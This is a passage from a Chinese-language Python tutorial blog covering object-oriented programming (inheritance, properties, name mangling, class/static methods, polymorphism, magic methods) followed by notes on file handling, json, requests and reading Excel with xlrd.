class="line">        <span class="built_in">print</span>(self.name.title()+<span class="string">&quot; rolled over!&quot;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>实例化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dog = Dog(<span class="string">&#x27;harry&#x27;</span>  ,<span class="number">6</span>)</span><br></pre></td></tr></table></figure>

<p>调用方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dog.sit()</span><br><span class="line">my_dog.roll_over()</span><br></pre></td></tr></table></figure>

<p><strong>py中类的属性没有用属性修饰值private和public区分</strong>，但是私有(private)对象/函数可以用<code>__name</code>的形式命名，受保护(protected)的对象/函数可以用<code>_name</code>的形式命名，后面还会提及</p>
<h4 id="修改特性值（3种方式）"><a href="#修改特性值（3种方式）" class="headerlink" title="修改特性值（3种方式）"></a>修改特性值（3种方式）</h4><ol>
<li>直接修改对象的值<code>对象名.特性名 = 值</code>（<code>object.attribute = value</code>）</li>
<li>通过方法修改特性(attribute)（简而言之，在类中建立一个函数（称之为方法），在方法内用self.属性名来改变特性值）</li>
<li>在方法中递增特性值</li>
</ol>
<h4 id="在子类中添加新方法"><a href="#在子类中添加新方法" class="headerlink" title="在子类中添加新方法"></a>在子类中添加新方法</h4><p>举个例子吧，以汽车中特斯拉和奥迪为例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_info</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;it a car&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Electric</span>(<span class="params">Car</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_electric_info</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;and it a electric car&quot;</span>)</span><br><span class="line"></span><br><span class="line">audi = Car()</span><br><span class="line">tesla = Electric()</span><br><span class="line"></span><br><span class="line">audi.print_info()</span><br><span class="line">tesla.print_info()</span><br><span class="line">tesla.print_electric_info()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">outs:</span></span><br><span class="line"><span class="string">it a car</span></span><br><span class="line"><span class="string">it a car                            </span></span><br><span class="line"><span class="string">and it a electric car</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="继承，override"><a href="#继承，override" class="headerlink" title="继承，override"></a>继承，override</h4><p>​    1.子类继承父类原有方法定义</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father_class</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, family_name, gender</span>):</span></span><br><span class="line">        self.family_name  = family_name</span><br><span class="line">        self.gender = gender</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_info</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.family_name+<span class="string">&#x27; &#x27;</span>+self.gender)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son_class</span>(<span class="params">Father_class</span>):</span>  <span class="comment">#继承就是将父类 类名 写入子类括号中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, family_name,gender,age</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(family_name,gender) <span class="comment">#super()用于获取父类方法的定义(因为儿子和父亲姓氏和性别相同)</span></span><br><span class="line">        self.age = age</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_info</span>(<span class="params">self</span>):</span>         <span class="comment">#相同的函数名出现在子类中，就会重写(overrides)父类方法</span></span><br><span class="line">       	<span class="built_in">print</span>(<span class="string">&quot;family name is:&quot;</span>+self.family_name +<span class="string">&quot;,son age is:&quot;</span>+self.age)</span><br><span class="line"></span><br><span class="line">father = Father_class(<span class="string">&#x27;smith&#x27;</span>,<span class="string">&#x27;male&#x27;</span>)</span><br><span class="line">son = Son_class(<span class="string">&#x27;smith&#x27;</span>,<span class="string">&#x27;male&#x27;</span>,<span class="string">&#x27;20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">son.print_info()</span><br><span class="line">father.print_info()</span><br><span class="line"><span class="comment">#outs: family name is:smith,son age is:20</span></span><br><span class="line"><span class="comment">#		smith male</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>super()是一个特殊的函数，帮助父类和子类联系起来</li>
<li>重写父类方法，当子类和父类的方法名重复时，子类方法会覆盖父类方法</li>
</ul>
<ol start="2">
<li>可以把类当作属性值赋值给另一个类中的属性，类似嵌套</li>
</ol>
<h4 id="使用属性对特性访问"><a href="#使用属性对特性访问" class="headerlink" title="使用属性对特性访问"></a>使用属性对特性访问</h4><p>刚刚再对修改属性进行讨论的时候提到过py并没有所谓的private和public属性，这里详细的来讨论一下吧</p>
<p>首先还是从c类语言开始，是否还记得当时写c类语言时私有类型是如何赋值和调用的？没错，我们需要在类中重新定义新的方法，比如使用<code>display()</code>/<code>show()</code>/<code>getter()</code>来调用私有类型输出，使用<code>input()</code>/<code>get()</code>/<code>setter()</code>来从外界获取数据赋值给私有类型。</p>
<p>在py中你也可以这么干，但是更具有py风格的是使用属性(property)，尽量记住英文吧，毕竟attribute被翻译成特性，中文的属性和特性我觉得实在差别不大</p>
<p>讲了那么多废话，直接看一个例子吧</p>
<ul>
<li>使用<code>setter</code>/<code>getter</code>对隐藏的特性进行访问(trump同志借你的名字用下哈)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Duck</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        self.hidden_name = input_name    <span class="comment">#这里的hidden_name相当于私有类型</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the getter&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.hidden_name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_name</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the setter&#x27;</span>)</span><br><span class="line">        self.hidden_name = input_name</span><br><span class="line">    name = <span class="built_in">property</span>(get_name, set_name)<span class="comment">#这两个方法定义为了 name 属性</span></span><br><span class="line">    	<span class="comment">#property() 的第一个参数是 getter 方法，第二个参 数是 setter 方法</span></span><br><span class="line"></span><br><span class="line">a_duck = Duck(<span class="string">&#x27;duck&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a_duck.get_name()) <span class="comment">#这里是显式调用等同于，隐式调用 print(a_duck.name)</span></span><br><span class="line"><span class="comment"># outs: inside the getter</span></span><br><span class="line"><span class="comment">#       duck</span></span><br><span class="line">a_duck.set_name(<span class="string">&#x27;trump&#x27;</span>)  <span class="comment">#这里是显式调用等同于，a_duck.name = &#x27;trump&#x27;    </span></span><br><span class="line"><span class="comment"># outs: inside the getter</span></span><br><span class="line"><span class="built_in">print</span>(a_duck.get_name())</span><br><span class="line"><span class="comment"># outs: trump</span></span><br></pre></td></tr></table></figure>

<ul>
<li>使用修饰符（decorator）</li>
</ul>
<p>上面那个例子看着有点麻烦，来个简单的写法</p>
<p>该例子中定义两个不同的方法，它 们都叫 **name()**，但包含不同的修饰符：</p>
<ul>
<li><p><code>@property</code>，用于指示 getter 方法；</p>
</li>
<li><p><code>@name.setter</code>，用于指示 setter 方法</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Duck</span>():</span></span><br><span class="line"><span class="meta">    @property              </span><span class="comment">#简单的理解property就是输出“私有类”</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the getter&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.hidden_name</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @name.setter          </span><span class="comment">#方法名.setter可以理解为输入</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the setter&#x27;</span>)</span><br><span class="line">        self.hidden_name = input_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        self.hidden_name = input_name</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">a_duck = Duck(<span class="string">&#x27;duck&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a_duck.name)</span><br><span class="line">a_duck.name = <span class="string">&#x27;trump&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a_duck.name)</span><br><span class="line"><span class="comment">#你仍然可以像之前访问特性一样访问 name，但这里没有了显式的 get_name() 和 set_name() 方法</span></span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">inside the getter</span></span><br><span class="line"><span class="string">duck</span></span><br><span class="line"><span class="string">inside the setter</span></span><br><span class="line"><span class="string">inside the getter</span></span><br><span class="line"><span class="string">trump</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在之前的例子中我们都用name属性指向类中存储的某一个特性（例子中式hidden_name）,除此之外我们可以让属性指向一个<em>计算结果值</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#一个输入半径转换直径的Circle类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,radius</span>):</span></span><br><span class="line">        self.radius = radius</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">diameter</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*self.radius</span><br><span class="line"></span><br><span class="line">c = Circle(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(c.radius)</span><br><span class="line"><span class="built_in">print</span>(c.diameter)</span><br><span class="line">c.radius = <span class="number">7</span>	<span class="comment">#当半径改变时，直径会自动改变</span></span><br><span class="line"><span class="built_in">print</span>(c.diameter)</span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 10 </span></span><br><span class="line"><span class="comment"># 14</span></span><br></pre></td></tr></table></figure>

<p>因为我们没有对直径设置setter属性(<code>@diameter.setter</code>)，那么无法从外部对直径进行修改，达到了保护数据的目的，只读属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c.diameter = <span class="number">9</span></span><br><span class="line"><span class="comment">#如果我给直径直接赋值，编译器就会报错</span></span><br><span class="line"><span class="comment"># AttributeError: can&#x27;t set attribute</span></span><br></pre></td></tr></table></figure>

<h4 id="使用名称重整来保护私有属性"><a href="#使用名称重整来保护私有属性" class="headerlink" title="使用名称重整来保护私有属性"></a>使用名称重整来保护私有属性</h4><p>这个标题可能会引发一些误会，再次声明py并没有真正意义上的私有类型。</p>
<p>刚刚我们在鸭子类中加了一个隐藏的属性<code>hidden_name</code>,但是这种方法有一个弊端，就是当我知道这个类中有这个属性的时候我可以这样调用<code>a_duck.hidden_name</code>,为了禁止这种行为引进名称重整，将你需要命名的私有属性变量命名成<code>__privatename</code>,加两条下划线</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#我只是把上面那个代码拔下来，将hidden_name全部替换为__name</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Duck</span>():</span></span><br><span class="line"><span class="meta">    @property             </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the getter&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.__name</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @name.setter          </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the setter&#x27;</span>)</span><br><span class="line">        self.__name = input_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        self.__name = input_name</span><br><span class="line">        </span><br><span class="line">a_duck = Duck(<span class="string">&#x27;trump&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a_duck.__name)    <span class="comment">#这样就会报错</span></span><br><span class="line"><span class="comment">#AttributeError: &#x27;Duck&#x27; object has no attribute &#x27;__name&#x27;</span></span><br><span class="line"><span class="comment">#其实只是py将代码重整成了 a_duck._Duck__name  这种形式而已</span></span><br></pre></td></tr></table></figure>

<p>好吧说了半天，这种保护特性的方式并不完美，但它确实能在一定程度上避免我们无意或有意地对特性进行直接访问</p>
<h4 id="类的方法"><a href="#类的方法" class="headerlink" title="类的方法"></a>类的方法</h4><p>​        在类的定义中，以 self 作为第一个参数的方法都是实例方法（instance method）。它们在 创建自定义类时最常用。实例方法的首个参数是 self，当它被调用时，Py会把调用该 方法的对象作为 self 参数传入。<br>​        与之相对，类方法（class method）会作用于整个类，对类作出的任何改变会对它的所有实 例对象产生影响。在类定义内部，用前缀修饰符 @classmethod 指定的方法都是类方法。与 实例方法类似，类方法的第一个参数是类本身。在 Py中，这个参数常被写作 cls，因为全称 class 是保留字，在这里我们无法使用。下面的例子中，我们为类 A 定义一个类方 法来记录一共有多少个类 A 的对象被创建：</p>
<ul>
<li><code>@classmethod</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>():</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        A.count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exclaim</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;I&#x27;m an A!&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kids</span>(<span class="params">cls</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;A has&quot;</span>, cls.count, <span class="string">&quot;little objects.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">easy_a = A()</span><br><span class="line">breezy_a = A()</span><br><span class="line">wheezy_a = A()</span><br><span class="line">A.kids()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">outs:</span></span><br><span class="line"><span class="string">A has 3 little objects.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>静态方法（static method），用 <code>@staticmethod 修饰</code>， 它既不需要 self 参数也不需要 class 参数</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greet</span>():</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">greeting</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Greet.greeting()</span><br><span class="line"><span class="comment">#outs: hello</span></span><br></pre></td></tr></table></figure>

<p>ok，静态方法不需要调用任何参数，甚至连对象都不需要，类名.方法名  可以直接调用，他的存在只是为了方便，不然这段代码会落单。</p>
<h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><p>还记得多态是什么吗？一起来回忆下吧。在oop中多态指的是一个实体具有多种形式，简单的按照字面意思理解，一个类具有多种形态，形态就体现在方法上,看段代码感受一下吧，虽然有点长，但其实很简单和清晰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Quote</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, person, words</span>):</span></span><br><span class="line">        self.person = person</span><br><span class="line">        self.words = words</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">who</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.person</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">says</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.words + <span class="string">&#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QuestionQuote</span>(<span class="params">Quote</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">says</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.words + <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExclamationQuote</span>(<span class="params">Quote</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">says</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.words + <span class="string">&#x27;!&#x27;</span></span><br><span class="line"></span><br><span class="line">hunter = Quote(<span class="string">&#x27;Elmer Fudd&#x27;</span>, <span class="string">&quot;I&#x27;m hunting wabbits&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(hunter.who(), <span class="string">&#x27;says:&#x27;</span>, hunter.says())</span><br><span class="line">hunted1 = QuestionQuote(<span class="string">&#x27;Bugs Bunny&#x27;</span>, <span class="string">&quot;What&#x27;s up, doc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(hunted1.who(), <span class="string">&#x27;says:&#x27;</span>, hunted1.says())</span><br><span class="line">hunted2 = ExclamationQuote(<span class="string">&#x27;Daffy Duck&#x27;</span>, <span class="string">&quot;It&#x27;s rabbit season&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(hunted2.who(), <span class="string">&#x27;says:&#x27;</span>, hunted2.says())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;outs:</span></span><br><span class="line"><span class="string">Elmer Fudd says: I&#x27;m hunting wabbits.</span></span><br><span class="line"><span class="string">Bugs Bunny says: What&#x27;s up, doc?</span></span><br><span class="line"><span class="string">Daffy Duck says: It&#x27;s rabbit season!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>py的多态不同于其他的oop语言，它无论对象的种类是什么，只要包含 who() 和 says()，你便可以调用它。我们再来定义一个 BabblingBrook 类，它与我们之前的猎人猎物（Quote 类的后代）什么的没有任何关系</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这段代码接上一段，再次使用多态，在无关类中实现</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BabblingBrook</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">who</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Brook&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">says</span>(<span class="params">self</span>):</span></span><br><span class="line">         <span class="keyword">return</span> <span class="string">&#x27;Babble&#x27;</span></span><br><span class="line"></span><br><span class="line">brook = BabblingBrook()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(brook.who()+<span class="string">&quot; says &quot;</span>+brook.says())</span><br><span class="line"><span class="comment">#outs: Brook says Babble</span></span><br></pre></td></tr></table></figure>

<h4 id="魔术方法special-method"><a href="#魔术方法special-method" class="headerlink" title="魔术方法special method"></a>魔术方法special method</h4><p>Python 的特殊方法（special method），有时也被称作魔术方法（magic method），这是一个很有有趣的部分，先来看一段代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Word</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        self.text = text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, word2</span>):</span>  <span class="comment"># 魔术方法</span></span><br><span class="line">        <span class="keyword">return</span> self.text.lower() == word2.text.lower()  <span class="comment"># lower是将字母变成小写</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">first = Word(<span class="string">&#x27;ha&#x27;</span>)</span><br><span class="line">second = Word(<span class="string">&#x27;HA&#x27;</span>)</span><br><span class="line">third = Word(<span class="string">&#x27;eh&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> first == second:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;True&#x27;</span>)</span><br><span class="line"><span class="comment"># outs: True</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> first == third:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;False&#x27;</span>)</span><br><span class="line"><span class="comment"># outs: False</span></span><br></pre></td></tr></table></figure>

<p>相信我不说也看得懂这段代码在干啥，没错正是比较单词是否相同（忽略大小写），唯一可能有所疑惑的便是<code>__eq__</code>，这便是魔术方法，常用如下，<a href="https://docs.python.org/2.5/ref/specialnames.html">官方文档</a> | <a href="https://diveintopython3.net/special-method-names.html">参考</a></p>
<p>![magic method](C:\Users\83487\Pictures\programmer path\magic method.jpg)<br>![magic method2](C:\Users\83487\Pictures\programmer path\magic method2.jpg)</p>
<ul>
<li>这里我忽略一个组合（composition 或聚合aggregation）未提及，相对于类的父子继承的方式，是一种类似 类与类兄弟 关系的一种，不常用，如果需要再查资料</li>
</ul>
<h4 id="从外部类导入类模块"><a href="#从外部类导入类模块" class="headerlink" title="从外部类导入类模块"></a>从外部类导入类模块</h4><p>例如，外部文件有<code>car.py</code>其中包含两个class，Car和Electrical</p>
<p>在my_car文件中应该导入这两个类<code>from car import Car ,Electrical</code></p>
<p>或者导入整个<code>import Car</code></p>
<p>再用<code>moudle_name.class_name</code>的形式调用类</p>
<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h4 id="文件-1"><a href="#文件-1" class="headerlink" title="文件"></a>文件</h4><p>未提及不使用with关键字的用法，使用with关键字可以让py自动判断是否关闭</p>
<ul>
<li>读取文件</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#with关键字可让py自动判断何时关闭</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;file_name&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    contents = file_object.read()</span><br><span class="line">    <span class="built_in">print</span>(contents)</span><br></pre></td></tr></table></figure>

<ul>
<li>获取文件当前的脚本目录和工作目录</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.path.dirname(os.path.abspath(__file__)) <span class="comment">#get directory name</span></span><br><span class="line">os.getcwd() <span class="comment">#get current working directory </span></span><br></pre></td></tr></table></figure>

<ul>
<li>写入文件</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file_name&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">&quot;i love programming&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>附加到文件末尾用append，<code>&#39;a&#39;</code>替换<code>&#39;w&#39;</code>即可</p>
<ul>
<li>一个例子</li>
</ul>
<p>获取当前文件的路径，并且添加一个pro.txt写入i love programming</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">pwd = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">os.chdir(pwd)</span><br><span class="line">file_path = <span class="string">&#x27;pro.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    contents = file_object.write(<span class="string">&quot;i love programming&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<p>从这里开始基础部分算是结束了，后面的还都是笔记的形式没整理成教程，就看看前面的吧，</p>
<p>下文应用方面的比较多</p>
<p>w+ 可读写，文件不存在时创建文件</p>
<p>r+，可读写，文件不存在时报错</p>
<p><code>truncate(size)</code>函数来删除 txt 文件内容，size是表示从第几个字节开始清除，如果是<code>0</code>时代表是删除全部内容（首先需要seek(0)不然可能会造成乱码）</p>
<p>b是以二进制的读入</p>
<hr>
<h3 id="用json存储数据"><a href="#用json存储数据" class="headerlink" title="用json存储数据"></a>用json存储数据</h3><p><strong>dumps将python内置的对象转化未json</strong></p>
<p><strong>loads将json数据读入作为python内置的对象</strong></p>
<ul>
<li><p>对api返回的json对象r，<code>r.json()</code>将原json转化为一个py字典</p>
</li>
<li><p>使用json.dump() , json.load()</p>
<ul>
<li>json.dump()</li>
</ul>
</li>
</ul>
<p>json.dump()接受两个实参，一个是要存储的数据，一个是存储数据的对象,</p>
<p>而json.dumps()方法可接受只有一个实参,即存储的数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">indent = <span class="number">4</span>,sort_keys=<span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>如上两个参数,indent=4使代码缩进4bytes  ,  sort_key升序排序(字母),同时试用与dump和dumps</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#directory save file &amp; output</span></span><br><span class="line">numbers = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file_name&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    json.dump(numbers,f_obj)</span><br></pre></td></tr></table></figure>



<p>​            b. json.load() </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#string to directory</span></span><br><span class="line">file_name = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file_name&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    numbers = json.load(f_obj)</span><br><span class="line">    </span><br><span class="line"> <span class="built_in">print</span>(numbers)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h3><ol>
<li><p><code>request.get(url)</code></p>
<p>假设<code>r=requests.get(url)</code>返回的对象r有如下属性</p>
</li>
</ol>
<p>r.status_code                         http请求返回状态,200表示正常</p>
<p>r.text                    http相应为字符串形式,返回页面的内容</p>
<p>r.encoding                从http header 中猜测的相应内容编码方式</p>
<p>r.apparent_encoding        从内容中分析出的响应内容编码方式（备选编码方式）</p>
<p>r.content                http响应内容的二进制形式</p>
<h3 id="处理excel表格"><a href="#处理excel表格" class="headerlink" title="处理excel表格"></a>处理excel表格</h3><h4 id="读"><a href="#读" class="headerlink" title="读"></a>读</h4><h5 id="使用xlrd"><a href="#使用xlrd" class="headerlink" title="使用xlrd"></a>使用xlrd</h5><p><strong>首先<code>from xlrd import open_workbook</code>导入py对excel导入支持</strong></p>
<p>读取excel首先需要打开，可以使用<code>example = openwork(file_name)</code></p>
<p>获取所有表格的名字(一个workbook有多个sheets) <code>example.sheet_names()</code></p>
<p>通过索引和名字获取表格，比如一个excel中第一张sheet叫做“价格”</p>
